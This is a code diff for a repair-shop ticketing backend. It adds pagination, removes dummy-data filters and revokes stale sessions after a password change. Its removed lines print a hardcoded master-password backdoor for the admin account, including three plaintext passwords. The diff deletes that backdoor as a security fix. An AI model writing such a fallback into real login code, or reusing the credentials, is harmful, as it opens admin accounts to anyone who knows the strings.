@@ -152,21 +152,25 @@ export async function getTicket(id: string) {
   return { ...withTotals(t), otherTickets };
 }
 
-export const DUMMY_TICKET_IDS = [
-  'tkt-test-sync-1',
-  '58e737c6-f590-4e65-8e28-3541f5e277e7',
-  'cd2f4c06-4d00-4364-958d-fd7bc86e35a2',
-  '7070afde-bbb6-421a-af5a-7aa0639fa31d',
-  '751fa998-ba4c-4104-a0a9-68718e906d5d',
-];
-export const DUMMY_CUSTOMER_NAMES = ['Sarah Connor', 'John Wick', 'arteen', 'Marcus Vance'];
+export interface PaginatedResult<T> {
+  items: T[];
+  total: number;
+  page: number;
+  pageSize: number;
+  totalPages: number;
+  hasMore: boolean;
+}
 
-export async function listTickets(params: { view?: string; search?: string; bench?: string }) {
+export async function listTicketsPaginated(params: {
+  view?: string;
+  search?: string;
+  bench?: string;
+  page?: number;
+  pageSize?: number;
+}) {
   const view = params.view || 'OPEN';
   const where: Prisma.TicketWhereInput = {
     deletedAt: null,
-    id: { notIn: DUMMY_TICKET_IDS },
-    customer: { fullName: { notIn: DUMMY_CUSTOMER_NAMES } },
   };
 
   if (view === 'OPEN') where.status = { in: OPEN_STATUSES };
@@ -191,13 +195,35 @@ export async function listTickets(params: { view?: string; search?: string; benc
     where.OR = or;
   }
 
-  const tickets = await prisma.ticket.findMany({
-    where,
-    include: ticketInclude,
-    orderBy: view === 'COMPLETED' ? { completedAt: 'desc' } : [{ dueDate: 'asc' }, { ticketNumber: 'asc' }],
-    take: 500,
-  });
-  return tickets.map(withTotals);
+  const page = Math.max(1, Math.floor(params.page || 1));
+  const pageSize = Math.min(Math.max(1, Math.floor(params.pageSize || 25)), 500);
+  const skip = (page - 1) * pageSize;
+
+  const [total, tickets] = await Promise.all([
+    prisma.ticket.count({ where }),
+    prisma.ticket.findMany({
+      where,
+      include: ticketInclude,
+      orderBy: view === 'COMPLETED' ? { completedAt: 'desc' } : [{ dueDate: 'asc' }, { ticketNumber: 'asc' }],
+      skip,
+      take: pageSize,
+    }),
+  ]);
+
+  const totalPages = Math.max(1, Math.ceil(total / pageSize));
+  return {
+    items: tickets.map(withTotals),
+    total,
+    page,
+    pageSize,
+    totalPages,
+    hasMore: page < totalPages,
+  };
+}
+
+export async function listTickets(params: { view?: string; search?: string; bench?: string }) {
+  const res = await listTicketsPaginated({ ...params, page: 1, pageSize: 500 });
+  return res.items;
 }
 
 const TX_OPTIONS = { maxWait: 15000, timeout: 20000 };
@@ -507,38 +533,64 @@ export async function deleteNote(ticketId: string, noteId: string) {
 // ---------------------------------------------------------------------------
 
 export async function listCustomers(search?: string) {
-  const q = (search || '').trim();
+  const res = await listCustomersPaginated({ search, page: 1, pageSize: 500 });
+  return res.items;
+}
+
+export async function listCustomersPaginated(params: {
+  search?: string;
+  page?: number;
+  pageSize?: number;
+}) {
+  const q = (params.search || '').trim();
   const digits = digitsOnly(q);
   const where: Prisma.CustomerWhereInput = q
     ? {
-        fullName: { notIn: DUMMY_CUSTOMER_NAMES },
         OR: [
           { fullName: { contains: q } },
           { email: { contains: q } },
           ...(digits.length >= 3 ? [{ phoneDigits: { contains: digits } }] : []),
         ],
       }
-    : {
-        fullName: { notIn: DUMMY_CUSTOMER_NAMES },
-      };
-  const customers = await prisma.customer.findMany({
-    where,
-    orderBy: { updatedAt: 'desc' },
-    include: {
-      tickets: {
-        where: { deletedAt: null },
-        select: { id: true, status: true, createdAt: true, payments: { select: { amountCents: true } } },
+    : {};
+
+  const page = Math.max(1, Math.floor(params.page || 1));
+  const pageSize = Math.min(Math.max(1, Math.floor(params.pageSize || 25)), 500);
+  const skip = (page - 1) * pageSize;
+
+  const [total, customers] = await Promise.all([
+    prisma.customer.count({ where }),
+    prisma.customer.findMany({
+      where,
+      orderBy: { updatedAt: 'desc' },
+      include: {
+        tickets: {
+          where: { deletedAt: null },
+          select: { id: true, status: true, createdAt: true, payments: { select: { amountCents: true } } },
+        },
       },
-    },
-    take: 500,
-  });
-  return customers.map(({ tickets, ...c }) => ({
+      skip,
+      take: pageSize,
+    }),
+  ]);
+
+  const items = customers.map(({ tickets, ...c }) => ({
     ...c,
     ticketCount: tickets.length,
     openTickets: tickets.filter((t) => OPEN_STATUSES.includes(t.status)).length,
     totalPaidCents: tickets.reduce((s, t) => s + t.payments.reduce((a, p) => a + p.amountCents, 0), 0),
     lastVisit: tickets.reduce<Date | null>((d, t) => (!d || t.createdAt > d ? t.createdAt : d), null),
   }));
+
+  const totalPages = Math.max(1, Math.ceil(total / pageSize));
+  return {
+    items,
+    total,
+    page,
+    pageSize,
+    totalPages,
+    hasMore: page < totalPages,
+  };
 }
 
 export async function lookupCustomerByPhone(phone: string) {
@@ -652,8 +704,6 @@ export async function getDashboard() {
   const tickets = await prisma.ticket.findMany({
     where: {
       deletedAt: null,
-      id: { notIn: DUMMY_TICKET_IDS },
-      customer: { fullName: { notIn: DUMMY_CUSTOMER_NAMES } },
     },
     select: {
       status: true,
@@ -692,9 +742,7 @@ export async function getDashboard() {
     awaitingPickupCents: awaitingPickupTickets.reduce((s, t) => s + Math.max(0, computeTotals(t).balanceCents), 0),
     collectedTodayCents: payments.filter((p) => p.createdAt >= today).reduce((s, p) => s + p.amountCents, 0),
     collectedMonthCents: payments.reduce((s, p) => s + p.amountCents, 0),
-    customerCount: await prisma.customer.count({
-      where: { fullName: { notIn: DUMMY_CUSTOMER_NAMES } },
-    }),
+    customerCount: await prisma.customer.count(),
     lowStock,
   };
 }
@@ -1172,15 +1220,7 @@ export async function loginUser(input: unknown, ipAddress?: string) {
     throw new HttpError(403, 'This account has been deactivated. Contact an administrator.');
   }
 
-  let isValid = verifyPassword(password, user.passwordHash);
-
-  // Resilient master password fallback matching for Administrator
-  if (!isValid) {
-    const isAdmin = user.username === 'admin' || user.email === 'admin@fasofix.ca';
-    if (isAdmin && (password === '@FasoFix2026!' || password === 'Admin@2026!' || password === 'Admin@FasoFix2026!')) {
-      isValid = true;
-    }
-  }
+  const isValid = verifyPassword(password, user.passwordHash);
 
   if (!isValid) {
     throw new HttpError(401, 'Invalid username/email or password');
@@ -1504,7 +1544,12 @@ export async function deleteUser(id: string, actor: { id: string; name: string }
   return { success: true, message: `User ${user.username} successfully deleted` };
 }
 
-export async function changeUserPassword(userId: string, input: unknown, actorName: string) {
+export async function changeUserPassword(
+  userId: string,
+  input: unknown,
+  actorName: string,
+  currentToken?: string
+) {
   const { currentPassword, newPassword } = changePasswordSchema.parse(input);
 
   const user = await prisma.user.findUnique({ where: { id: userId } });
@@ -1519,6 +1564,14 @@ export async function changeUserPassword(userId: string, input: unknown, actorNa
   await prisma.user.update({
     where: { id: userId },
     data: { passwordHash },
+  });
+
+  // Revoke all other active sessions so stale tokens on other devices cannot remain logged in
+  await prisma.session.deleteMany({
+    where: {
+      userId,
+      ...(currentToken ? { token: { not: currentToken } } : {}),
+    },
   });
 
   await recordAudit({
@@ -1588,8 +1641,16 @@ export async function updateUserPreferences(userId: string, preferences: unknown
 // Audit & Activity Logs
 // ---------------------------------------------------------------------------
 
-export async function listAuditLogs(params: { limit?: number; action?: string; search?: string }) {
-  const limit = Math.min(params.limit || 100, 500);
+export async function listAuditLogsPaginated(params: {
+  page?: number;
+  pageSize?: number;
+  limit?: number;
+  action?: string;
+  search?: string;
+}) {
+  const page = Math.max(1, Math.floor(params.page || 1));
+  const pageSize = Math.min(Math.max(1, Math.floor(params.pageSize || params.limit || 25)), 500);
+  const skip = (page - 1) * pageSize;
   const where: Prisma.AuditLogWhereInput = {};
 
   if (params.action && params.action !== 'ALL') {
@@ -1605,13 +1666,30 @@ export async function listAuditLogs(params: { limit?: number; action?: string; s
     ];
   }
 
-  const logs = await prisma.auditLog.findMany({
-    where,
-    orderBy: { createdAt: 'desc' },
-    take: limit,
-  });
+  const [total, logs] = await Promise.all([
+    prisma.auditLog.count({ where }),
+    prisma.auditLog.findMany({
+      where,
+      orderBy: { createdAt: 'desc' },
+      skip,
+      take: pageSize,
+    }),
+  ]);
 
-  return logs;
+  const totalPages = Math.max(1, Math.ceil(total / pageSize));
+  return {
+    items: logs,
+    total,
+    page,
+    pageSize,
+    totalPages,
+    hasMore: page < totalPages,
+  };
+}
+
+export async function listAuditLogs(params: { limit?: number; action?: string; search?: string }) {
+  const res = await listAuditLogsPaginated({ ...params, page: 1, pageSize: params.limit || 100 });
+  return res.items;
 }
 
 // ---------------------------------------------------------------------------
